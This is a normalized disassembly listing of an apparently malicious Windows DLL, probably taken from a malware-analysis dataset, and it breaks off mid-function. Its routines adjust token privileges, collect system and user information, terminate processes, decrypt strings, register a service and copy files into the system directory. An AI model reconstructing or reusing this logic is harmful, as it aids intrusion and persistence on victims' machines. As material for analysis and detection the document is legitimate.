sub_71001000
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
lea eax [ ebp - 0x4 ]
push eax
push 0x20
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
mov edi [ LookupPrivilegeValueA@IAT ]
lea eax [ ebp - 0xc ]
push eax
push r--data
xor esi esi
push esi
call edi
mov eax [ ebp - 0xc ]
mov ebx [ AdjustTokenPrivileges@IAT ]
push esi
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
push esi
push esi
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push [ ebp - 0x4 ]
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x10 ] 0x2
call ebx
lea eax [ ebp - 0xc ]
push eax
push r--data
push esi
call edi
mov eax [ ebp - 0xc ]
push esi
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
push esi
push esi
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push [ ebp - 0x4 ]
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x10 ] 0x2
call ebx
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebx
leave
retn
sub_7100109e
push ebp
lea ebp [ esp - 0x684 ]
sub esp 0x704
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x680 ] eax
push ebx
push esi
push edi
mov esi 0x200
push esi
lea eax [ ebp + 0x280 ]
push 0x0
push eax
call memset
mov edi 0x2000
push edi
call [ malloc@IAT ]
push edi
mov ebx eax
push 0x0
push ebx
mov [ ebp - 0x18 ] ebx
call memset
mov edi [ sprintf@IAT ]
push r--data
push ebx
call edi
add esp 0x24
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp + 0x280 ]
push eax
mov [ ebp - 0x20 ] 0x10
call [ GetComputerNameA@IAT ]
test eax eax
jne r-xdata
push r--data
push ebx
call strcat
lea eax [ ebp + 0x280 ]
push eax
push ebx
call strcat
push r--data
push ebx
call strcat
add esp 0x18
push r--data
push ebx
call strcat
pop ecx
pop ecx
jmp r-xdata
push r--data
push ebx
call strcat
lea eax [ ebp + 0x280 ]
push eax
push ebx
call strcat
push r--data
push ebx
call strcat
add esp 0x18
push r--data
push ebx
call strcat
pop ecx
pop ecx
jmp r-xdata
push esi
lea eax [ ebp + 0x280 ]
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp + 0x280 ]
push eax
mov [ ebp - 0x20 ] esi
call [ GetUserNameA@IAT ]
test eax eax
jne r-xdata
push r--data
sub eax 0x64
je r-xdata
lea eax [ ebp - 0x80 ]
push eax
call [ GetSystemInfo@IAT ]
mov eax [ ebp - 0x68 ]
sub eax 0x182
je r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x0
je r-xdata
push r--data
push [ ebp - 0x18 ]
call strcat
pop ecx
pop ecx
jmp r-xdata
push r--data
jmp r-xdata
sub eax 0x64
je r-xdata
push r--data
dec eax
je r-xdata
lea eax [ ebp - 0x3c ]
push eax
call GetSystemPowerStatus
push esi
mov [ ebp - 0x1c ] eax
lea eax [ ebp + 0x480 ]
push 0x0
push eax
call memset
add esp 0xc
cmp [ ebp - 0x1c ] 0x0
je r-xdata
lea eax [ ebp + 0x80 ]
push r--data
jmp r-xdata
sub eax 0xd56
lea eax [ ebp + 0x80 ]
je r-xdata
push r--data
cmp [ ebp - 0x3b ] 0x80
je r-xdata
push r--data
jmp r-xdata
dec eax
lea eax [ ebp + 0x280 ]
je r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
fdiv [ r--data ]
lea eax [ ebp + 0x480 ]
fstp [ esp + 0x4 ]
mov [ esp ] r--data
push eax
call edi
lea eax [ ebp + 0x480 ]
push eax
push [ ebp - 0x18 ]
call strcat
push esi
lea eax [ ebp + 0x480 ]
push 0x0
push eax
mov [ ebp - 0x5c ] 0x20
call memset
add esp 0x24
lea eax [ ebp - 0x5c ]
push eax
call [ GlobalMemoryStatus@IAT ]
mov eax [ ebp - 0x48 ]
shr eax 0x14
push eax
mov eax [ ebp - 0x4c ]
shr eax 0x14
push eax
push [ ebp - 0x58 ]
mov eax [ ebp - 0x54 ]
shr eax 0x14
push eax
lea eax [ ebp + 0x480 ]
push r--data
push eax
call edi
mov esi [ ebp - 0x18 ]
lea eax [ ebp + 0x480 ]
push eax
push esi
call strcat
push ebx
push esi
call strcat
add esp 0x28
mov [ ebp - 0x18 ] 0x43
mov [ ebp - 0x1c ] 0x18
fadd [ r--data ]
cmp [ ebp - 0x3b ] 0xff
je r-xdata
lea eax [ ebp + 0x280 ]
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push eax
call strcpy
pop ecx
pop ecx
push esi
lea eax [ ebp + 0x280 ]
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x14 ]
push eax
mov [ ebp - 0x14 ] 0x94
call [ GetVersionExA@IAT ]
test eax eax
mov ebx r--data
jne r-xdata
lea eax [ ebp + 0x480 ]
push eax
push esi
call strcat
push r--data
dec eax
je r-xdata
push r--data
jmp r-xdata
push eax
call strcpy
pop ecx
pop ecx
push esi
lea eax [ ebp + 0x480 ]
push 0x0
push eax
call memset
lea eax [ ebp + 0x80 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
lea eax [ ebp + 0x280 ]
push [ ebp - 0x10 ]
push eax
lea eax [ ebp + 0x480 ]
push r--data
push eax
call edi
lea eax [ ebp + 0x480 ]
push eax
push [ ebp - 0x18 ]
call strcat
push ebx
push [ ebp - 0x18 ]
call strcat
add esp 0x38
push [ ebp - 0x18 ]
lea eax [ ebp + 0x480 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ ebp + 0x480 ]
push eax
call [ GetDriveTypeA@IAT ]
sub eax 0x0
je r-xdata
push r--data
push esi
call strcat
push ebx
push esi
call strcat
mov ecx [ ebp + 0x680 ]
add esp 0x10
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_71005920
add ebp 0x684
leave
retn
mov [ ebp + 0x480 ] 0x0
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp + 0x480 ]
push eax
call edi
pop ecx
pop ecx
lea eax [ ebp + 0x480 ]
push eax
push [ ebp - 0x18 ]
call strcat
pop ecx
pop ecx
call [ GetTickCount@IAT ]
push esi
mov [ ebp - 0x1c ] eax
lea eax [ ebp + 0x480 ]
push 0x0
push eax
call memset
fild [ ebp - 0x1c ]
mov eax [ ebp - 0x1c ]
test eax eax
jge r-xdata
inc [ ebp - 0x18 ]
dec [ ebp - 0x1c ]
jne r-xdata
lea eax [ ebp + 0x480 ]
push eax
push esi
call strcat
push r--data
jmp r-xdata
dec eax
je r-xdata
push esi
call strcat
add esp 0x10
push [ ebp - 0x18 ]
lea eax [ ebp + 0x280 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp + 0x280 ]
push eax
call [ GetDiskFreeSpaceA@IAT ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x30 ]
imul eax [ ebp - 0x28 ]
shr eax 0xa
mov ecx eax
imul eax [ ebp - 0x24 ]
imul ecx [ ebp - 0x2c ]
push ecx
push eax
push [ ebp - 0x18 ]
lea eax [ ebp + 0x80 ]
push r--data
push eax
call edi
lea eax [ ebp + 0x80 ]
push eax
push esi
call strcat
push ebx
push esi
call strcat
add esp 0x24
jmp r-xdata
push r--data
dec eax
je r-xdata
push r--data
jmp r-xdata
dec eax
lea eax [ ebp + 0x480 ]
je r-xdata
lea eax [ ebp + 0x480 ]
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push eax
call strcat
lea eax [ ebp + 0x480 ]
push eax
push esi
call strcat
push ebx
push esi
call strcat
add esp 0x18
jmp r-xdata
sub_71001582
push ebx
push ebp
push esi
push edi
mov esi ecx
xor ebx ebx
cmp [ esi + 0x4 ] ebx
mov edi 0x2000
mov ebp edi
jne r-xdata
push edi
call [ malloc@IAT ]
cmp eax ebx
pop ecx
mov [ esi + 0x4 ] eax
je r-xdata
push ebx
call [ free@IAT ]
pop ecx
pop edi
pop esi
pop ebp
pop ebx
retn
push ebx
push edi
push eax
push 0x5
call [ esi ]
mov ebx 0xc0000004
jmp r-xdata
cmp eax ebx
je r-xdata
add ebp edi
push ebp
push [ esi + 0x4 ]
call [ realloc@IAT ]
pop ecx
pop ecx
push 0x0
push ebp
push eax
push 0x5
mov [ esi + 0x4 ] eax
call [ esi ]
sub_71001600
push ebp
mov ebp esp
sub esp 0x1c
lea eax [ ebp - 0x4 ]
push eax
push 0x20028
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
leave
retn 0x8
push esi
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x8 ]
xor esi esi
push esi
call [ LookupPrivilegeValueA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
neg eax
push esi
sbb eax eax
push esi
and eax 0x2
push esi
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push [ ebp - 0x4 ]
mov [ ebp - 0x1c ] 0x1
call [ AdjustTokenPrivileges@IAT ]
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
call [ GetLastError@IAT ]
neg eax
sbb eax eax
inc eax
inc eax
jmp r-xdata
pop esi
sub_71001682
push 0x24
push r--data
call sub_7100593c
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x8 ]
push ebx
push 0x400
call [ OpenProcess@IAT ]
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_71001758
jmp sub_71001758
lea ecx [ ebp - 0x20 ]
push ecx
push 0x8
push eax
call [ OpenProcessToken@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax ebx
je r-xdata
mov [ ebp + 0x8 ] ebx
lea eax [ ebp + 0x8 ]
push eax
push ebx
push ebx
push 0x1
push [ ebp - 0x20 ]
mov esi [ GetTokenInformation@IAT ]
call esi
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
add eax eax
push eax
call ??2@YAPAXI@Z
pop ecx
mov edi eax
mov [ ebp - 0x28 ] edi
mov eax [ ebp + 0x8 ]
add eax eax
mov [ ebp + 0x8 ] eax
lea ecx [ ebp + 0x8 ]
push ecx
push eax
push edi
push 0x1
push [ ebp - 0x20 ]
call esi
mov [ ebp - 0x1c ] eax
call [ GetLastError@IAT ]
cmp [ ebp - 0x1c ] ebx
je r-xdata
mov eax 0x104
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp + 0xc ]
lea ecx [ eax + 0x104 ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push eax
push [ edi ]
push ebx
call [ LookupAccountSidA@IAT ]
mov [ ebp - 0x1c ] eax
sub_71001758
cmp [ ebp - 0x24 ] ebx
je r-xdata
cmp [ ebp - 0x20 ] ebx
je r-xdata
push [ ebp - 0x24 ]
call [ CloseHandle@IAT ]
cmp [ ebp - 0x28 ] ebx
je r-xdata
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_71005981
retn 0x8
push [ ebp - 0x28 ]
call ??3@YAXPAX@Z
pop ecx
sub_71001790
push ecx
push ecx
push ebx
push ebp
push esi
mov esi [ malloc@IAT ]
push edi
push 0x64
pop ebp
push ebp
mov [ esp + 0x14 ] ecx
call esi
push ebp
mov edi eax
push 0x0
push edi
call memset
push ebp
call esi
push ebp
mov esi eax
push 0x0
push esi
call memset
mov ecx [ esp + 0x30 ]
add esp 0x20
push 0x1
mov ebx r--data
push ebx
call sub_71001600
push [ esp + 0x1c ]
push 0x1
push 0x1f0fff
call [ OpenProcess@IAT ]
test eax eax
mov [ esp + 0x14 ] eax
je r-xdata
push [ esp + 0x14 ]
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x10 ]
push 0x0
push ebx
call sub_71001600
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn 0x4
push 0x0
push eax
call [ TerminateProcess@IAT ]
test eax eax
push ebp
push 0x0
push esi
jne r-xdata
call memset
push [ esp + 0x28 ]
push r--data
push esi
call [ sprintf@IAT ]
push esi
push edi
call strcat
add esp 0x20
push 0x1f4
call [ Sleep@IAT ]
call memset
push [ esp + 0x28 ]
push r--data
push esi
call [ sprintf@IAT ]
push esi
push edi
call strcat
add esp 0x20
jmp r-xdata
sub_71001869
sub esp 0xc
push ebx
push ebp
push esi
push edi
mov edi 0x2000
push edi
mov esi ecx
call [ malloc@IAT ]
push edi
xor ebp ebp
push ebp
push eax
mov [ esp + 0x24 ] eax
call memset
add esp 0x10
mov ecx esi
call sub_71001582
mov edi [ MultiByteToWideChar@IAT ]
push ebp
push ebp
push 0xffffffff
push [ esp + 0x2c ]
mov [ esp + 0x20 ] ebp
push ebp
push ebp
call edi
xor ecx ecx
push 0x2
pop edx
mov ebx eax
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call ??2@YAPAXI@Z
pop ecx
push ebx
push eax
push 0xffffffff
push [ esp + 0x2c ]
mov [ esp + 0x28 ] eax
push ebp
push ebp
call edi
cmp [ eax + 0x3c ] ebp
jne r-xdata
mov [ esp + 0x10 ] 0x1
mov eax [ esi + 0x4 ]
push 0x4
push [ eax + 0x3c ]
push [ esp + 0x20 ]
call [ _wcsnicmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ eax ]
add ecx eax
mov [ esi + 0x4 ] ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
add ecx eax
cmp [ esp + 0x10 ] ebp
mov [ esi + 0x4 ] ecx
je r-xdata
mov eax [ esi + 0x4 ]
push [ eax + 0x44 ]
mov ecx esi
call sub_71001790
push eax
push [ esp + 0x18 ]
call strcat
pop ecx
pop ecx
mov eax [ esi + 0x4 ]
cmp [ eax ] ebp
jne r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn 0x4
sub_7100193e
push ebp
lea ebp [ esp - 0x219c ]
mov eax 0x221c
call sub_710059c0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x2198 ] eax
push ebx
mov ebx [ malloc@IAT ]
push esi
push edi
mov esi 0x2000
push esi
mov edi ecx
call ebx
push esi
push 0x0
push eax
mov [ ebp - 0x7c ] eax
call memset
push esi
call ebx
push esi
xor ebx ebx
push ebx
push eax
mov [ ebp - 0x78 ] eax
call memset
add esp 0x20
cmp [ edi + 0x4 ] ebx
mov [ ebp - 0x71 ] bl
jne r-xdata
push r--data
push [ ebp - 0x7c ]
call strcat
pop ecx
mov [ ebp - 0x80 ] ebx
mov ebx [ sprintf@IAT ]
pop ecx
mov ecx edi
call sub_71001582
inc [ ebp - 0x80 ]
mov [ ebp - 0x71 ] 0x1
jmp r-xdata
push r--data
push [ ebp - 0x78 ]
call ebx
push [ ebp - 0x78 ]
push [ ebp - 0x7c ]
call strcat
add esp 0x14
lea eax [ ebp + 0x94 ]
push eax
push r--data
push [ ebp - 0x78 ]
call ebx
push [ ebp - 0x78 ]
push [ ebp - 0x7c ]
call strcat
add esp 0x18
jmp r-xdata
push 0x208
lea eax [ ebp - 0x70 ]
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x70 ]
push eax
mov eax [ edi + 0x4 ]
push [ eax + 0x44 ]
mov ecx edi
call sub_71001682
xor eax eax
push eax
push eax
push esi
lea ecx [ ebp + 0x198 ]
push ecx
mov ecx [ edi + 0x4 ]
push 0xffffffff
push [ ecx + 0x3c ]
push 0x200
push eax
call [ WideCharToMultiByte@IAT ]
lea eax [ ebp + 0x198 ]
push eax
mov eax [ edi + 0x4 ]
push [ eax + 0x44 ]
push r--data
push [ ebp - 0x78 ]
call ebx
push [ ebp - 0x78 ]
push [ ebp - 0x7c ]
call strcat
lea eax [ ebp + 0x94 ]
push eax
call strlen
add esp 0x1c
test eax eax
lea eax [ ebp - 0x70 ]
push eax
je r-xdata
mov eax [ edi + 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp - 0x80 ]
push r--data
push [ ebp - 0x78 ]
call ebx
push [ ebp - 0x78 ]
push [ ebp - 0x7c ]
call strcat
mov ecx [ ebp + 0x2198 ]
mov eax [ ebp - 0x7c ]
add esp 0x14
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_71005920
add ebp 0x219c
leave
retn
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
add ecx eax
cmp [ ebp - 0x71 ] 0x0
mov [ edi + 0x4 ] ecx
je r-xdata
sub_71001ac7
push ebp
lea ebp [ esp - 0x78 ]
sub esp 0xf4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x74 ] eax
push ebx
push esi
push edi
mov ebx 0xc8
push ebx
lea eax [ ebp - 0x60 ]
push 0x0
push eax
call memset
push 0xa
lea eax [ ebp + 0x68 ]
push 0x0
push eax
call memset
lea eax [ ebp - 0x6c ]
push eax
call [ _time64@IAT ]
lea eax [ ebp - 0x7c ]
push eax
call [ _ftime64@IAT ]
push [ ebp - 0x68 ]
mov esi [ sprintf@IAT ]
push [ ebp - 0x6c ]
mov edi r--data
lea eax [ ebp - 0x60 ]
push edi
push eax
call esi
movzx eax [ ebp - 0x74 ]
push eax
lea eax [ ebp + 0x68 ]
push r--data
push eax
call esi
lea eax [ ebp + 0x68 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call strcat
lea eax [ ebp - 0x60 ]
add esp 0x44
push eax
call [ atoi@IAT ]
mov [ ebp - 0x64 ] eax
fild [ ebp - 0x64 ]
fmul [ r--data ]
call sub_71005a36
xor eax 0xb38d5e19
push eax
mov [ rw-data ] eax
call abs
push eax
mov [ rw-data ] eax
lea eax [ ebp - 0x60 ]
push edi
push eax
call esi
lea eax [ ebp - 0x60 ]
push r--data
push eax
call strcat
push ebx
xor edi edi
push edi
mov esi rw-data
push esi
call memset
lea eax [ ebp - 0x60 ]
push eax
push esi
call strcpy
push esi
call strlen
add esp 0x34
test eax eax
jle r-xdata
mov eax [ rw-data ]
push 0x64
pop ecx
pop edi
pop esi
pop ebx
not [ edi + rw-data ]
push esi
inc edi
call strlen
cmp edi eax
pop ecx
jl r-xdata
mov edx eax
shr edx 0x6
xor edx eax
shr edx 0x18
and edx 0x1
add eax eax
or eax edx
dec ecx
jne r-xdata
push 0x64
mov [ rw-data ] eax
pop ecx
mov edx eax
shr edx 0xd
xor edx eax
shr edx 0x11
and edx 0x1
add eax eax
or eax edx
dec ecx
jne r-xdata
mov ecx [ ebp + 0x74 ]
xor ecx ebp
mov [ rw-data ] eax
call sub_71005920
add ebp 0x78
leave
retn
sub_71001c16
push ebp
lea ebp [ esp - 0x1f90 ]
mov eax 0x2010
call sub_710059c0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x1f8c ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x1f98 ]
push 0xc8
xor ebx ebx
push ebx
mov esi rw-data
push esi
call memset
mov edx esi
add esp 0xc
mov [ ebp - 0x78 ] ebx
mov eax edi
sub edx edi
cmp ebx [ ebp + 0x1f9c ]
jne r-xdata
inc ebx
mov [ edx + eax ] cl
inc eax
cmp ebx 0x32
mov [ ebp - 0x78 ] ebx
jb r-xdata
mov ebx 0x2000
push ebx
lea eax [ ebp - 0x74 ]
push 0x0
push eax
call memset
mov eax [ ebp - 0x78 ]
add esp 0xc
inc eax
cmp eax [ ebp + 0x1f9c ]
mov [ ebp - 0x80 ] eax
jae r-xdata
xor eax eax
jmp r-xdata
mov cl [ eax ]
not cl
cmp cl 0x23
mov [ eax ] cl
je r-xdata
push ebx
push 0x0
push edi
call memset
mov eax [ ebp + 0x1f9c ]
sub eax [ ebp - 0x78 ]
push eax
lea eax [ ebp - 0x74 ]
push eax
push edi
call memcpy
push esi
call [ atoi@IAT ]
add esp 0x1c
push 0x64
pop ecx
mov edx eax
sub edx [ ebp - 0x78 ]
lea ecx [ edi + eax ]
lea edx [ ebp + edx - 0x75 ]
mov [ ebp - 0x7c ] edx
mov edx [ ebp + 0x1f9c ]
sub edx eax
push edx
push ecx
push [ ebp - 0x7c ]
call memcpy
add esp 0xc
mov ecx [ ebp + 0x1f8c ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_71005920
add ebp 0x1f90
leave
retn 0x8
mov edx eax
shr edx 0x6
xor edx eax
shr edx 0x18
and edx 0x1
add eax eax
or eax edx
dec ecx
jne r-xdata
push 0x64
mov [ rw-data ] eax
pop ecx
mov edx eax
shr edx 0xd
xor edx eax
shr edx 0x11
and edx 0x1
add eax eax
or eax edx
dec ecx
jne r-xdata
mov [ rw-data ] eax
mov eax [ ebp + 0x1f9c ]
sub eax [ ebp - 0x80 ]
sub_71001d4d
push ebx
push 0x4
xor ebx ebx
push ebx
push rw-data
call memset
add esp 0xc
cmp [ esp + 0x8 ] ebx
jle r-xdata
mov al 0x1
pop ebx
retn 0x4
mov edx [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
xor ecx ecx
mov eax esi
mov edi eax
shr edi cl
add ecx 0x8
and edi 0xff
xor eax edi
cmp ecx 0x20
jl r-xdata
mov [ ebx + rw-data ] al
inc ebx
cmp ebx [ esp + 0x10 ]
mov [ rw-data ] eax
jl r-xdata
lea eax [ esi + edx ]
mov ecx ebx
shl ecx 0x10
xor eax ecx
add eax ebx
mov ecx eax
shl eax 0x10
shr ecx 0x10
add ecx eax
xor edx ecx
xor esi ecx
test bl 0x1
mov eax edx
jne r-xdata
pop edi
mov [ rw-data ] esi
mov [ rw-data ] edx
pop esi
sub_71001de9
push ebp
sub esp 0x1f4
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x1f4 ] eax
push 0x2c
mov eax sub_71006436
call sub_71005ab8
mov eax [ ebp + 0x200 ]
mov ecx [ ebp + 0x208 ]
mov esi [ ebp + 0x204 ]
xor ebx ebx
cmp eax ebx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x14 ] 0x80000002
mov [ ebp - 0x4 ] ebx
je r-xdata
xor eax eax
cmp [ eax ] bl
je r-xdata
push eax
push r--data
lea eax [ ebp ]
push 0x1f4
push eax
call [ _snprintf@IAT ]
add esp 0x10
lea eax [ ebp - 0x14 ]
push eax
push 0x1
push ebx
lea eax [ ebp ]
push eax
push [ ebp - 0x14 ]
call [ RegOpenKeyExA@IAT ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push esi
mov esi [ RegQueryValueExA@IAT ]
lea eax [ ebp - 0x24 ]
push eax
push ebx
push r--data
push [ ebp - 0x14 ]
mov [ ebp - 0x18 ] 0x104
call esi
mov edi [ SetLastError@IAT ]
push eax
mov [ ebp - 0x30 ] eax
call edi
cmp [ ebp - 0x30 ] ebx
je r-xdata
mov [ ebp - 0x34 ] r--data
push r--data
lea eax [ ebp - 0x34 ]
lea eax [ ebp - 0x18 ]
push eax
push [ ebp - 0x2c ]
lea eax [ ebp - 0x24 ]
push eax
push ebx
push r--data
push [ ebp - 0x14 ]
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x18 ] 0x4
call esi
mov esi eax
push esi
call edi
cmp esi ebx
je r-xdata
mov [ ebp - 0x20 ] r--data
push r--data
lea eax [ ebp - 0x20 ]
jmp r-xdata
mov [ ebp - 0x1c ] 0x2
push [ ebp - 0x14 ]
call [ RegCloseKey@IAT ]
mov eax [ ebp - 0x1c ]
jmp r-xdata
mov [ ebp - 0x28 ] r--data
push r--data
lea eax [ ebp - 0x28 ]
jmp r-xdata
push eax
call _CxxThrowException
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x1f4 ]
xor ecx ebp
call sub_71005920
add ebp 0x1f8
leave
retn 0xc
sub_71001f61
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x8 ]
and [ ebp - 0xc ] 0x0
mov [ rw-data ] eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ rw-data ]
mov [ ebp - 0x1c ] 0x10
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x4 ] 0xbb8
call [ SetServiceStatus@IAT ]
leave
retn 0xc
sub_71001fab
mov eax [ esp + 0x4 ]
dec eax
push esi
je r-xdata
push 0x1
xor esi esi
push esi
push 0x3
call sub_71001f61
push 0xa
call [ Sleep@IAT ]
dec eax
je r-xdata
push 0x1
xor esi esi
push esi
push 0x6
call sub_71001f61
push esi
push esi
push 0x7
jmp r-xdata
dec eax
je r-xdata
call sub_71001f61
push 0x1
xor esi esi
push esi
push 0x5
call sub_71001f61
push esi
push esi
push 0x4
jmp r-xdata
dec eax
je r-xdata
xor esi esi
push esi
push esi
push [ rw-data ]
jmp r-xdata
dec eax
jne r-xdata
pop esi
retn 0x4
xor esi esi
jmp r-xdata
push esi
push esi
push 0x1
sub_71002014
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x98 ]
push eax
mov [ ebp - 0x98 ] 0x94
call [ GetVersionExA@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x88 ] 0x0
je r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
cmp [ ebp - 0x88 ] 0x2
sete al
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_71005920
leave
retn
sub_710020b0
push ebp
lea ebp [ esp - 0x3bc ]
sub esp 0x43c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x3b8 ] eax
push esi
mov esi 0x104
push esi
lea eax [ ebp + 0xac ]
push eax
call [ GetSystemDirectoryA@IAT ]
lea eax [ ebp - 0x7c ]
push eax
push r--data
call [ _findfirst64i32@IAT ]
cmp eax 0xffffffff
pop ecx
pop ecx
mov [ ebp - 0x80 ] eax
je r-xdata
mov ecx [ ebp + 0x3b8 ]
xor ecx ebp
pop esi
call sub_71005920
add ebp 0x3bc
leave
retn
push ebx
mov ebx [ GetFileAttributesA@IAT ]
push edi
lea eax [ ebp - 0x58 ]
push eax
call ebx
mov edi [ strstr@IAT ]
jmp r-xdata
test al 0x10
je r-xdata
lea eax [ ebp - 0x58 ]
push r--data
push eax
call edi
test eax eax
pop ecx
pop ecx
jne r-xdata
cmp [ ebp - 0x58 ] 0x2e
je r-xdata
push esi
lea eax [ ebp + 0x2b4 ]
push 0x0
push eax
call memset
lea eax [ ebp + 0x2b4 ]
push esi
push eax
call [ _getcwd@IAT ]
lea eax [ ebp + 0x2b4 ]
push r--data
push eax
call strcat
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp + 0x2b4 ]
push eax
call strcat
push esi
lea eax [ ebp + 0x1b0 ]
push 0x0
push eax
call memset
lea eax [ ebp + 0xac ]
push eax
lea eax [ ebp + 0x1b0 ]
push eax
call strcpy
lea eax [ ebp + 0x1b0 ]
push r--data
push eax
call strcat
add esp 0x40
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp + 0x1b0 ]
push eax
call strcat
pop ecx
pop ecx
push 0x1
lea eax [ ebp + 0x1b0 ]
push eax
lea eax [ ebp + 0x2b4 ]
push eax
call [ CopyFileA@IAT ]
push 0x32
call [ Sleep@IAT ]
lea eax [ ebp - 0x58 ]
push r--data
push eax
call edi
test eax eax
pop ecx
pop ecx
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ ebp - 0x80 ]
call [ _findnext64i32@IAT ]
test eax eax
pop ecx
pop ecx
je r-xdata
lea eax [ ebp - 0x58 ]
push eax
call [ _chdir@IAT ]
pop ecx
call sub_710020b0
push r--data
call [ _chdir@IAT ]
pop ecx
jmp r-xdata
lea eax [ ebp - 0x58 ]
push eax
call ebx
push [ ebp - 0x80 ]
call [ _findclose@IAT ]
pop ecx
pop edi
pop ebx
lea eax [ ebp - 0x58 ]
push r--data
push eax
call edi
test eax eax
pop ecx
pop ecx
jne r-xdata
lea eax [ ebp - 0x58 ]
push r--data
push eax
call edi
test eax eax
pop ecx
pop ecx
jne r-xdata
lea eax [ ebp - 0x58 ]
push r--data
push eax
call edi
test eax eax
pop ecx
pop ecx
jne r-xdata
lea eax [ ebp - 0x58 ]
push r--data
push eax
call edi
test eax eax
pop ecx
pop ecx
jne r-xdata
lea eax [ ebp - 0x58 ]
push r--data
push eax
call edi
test eax eax
pop ecx
pop ecx
jne r-xdata
lea eax [ ebp - 0x58 ]
push r--data
push eax
call edi
test eax eax
pop ecx
pop ecx
jne r-xdata
lea eax [ ebp - 0x58 ]
push r--data
push eax
call edi
test eax eax
pop ecx
pop ecx
jne r-xdata
lea eax [ ebp - 0x58 ]
push r--data
push eax
call edi
test eax eax
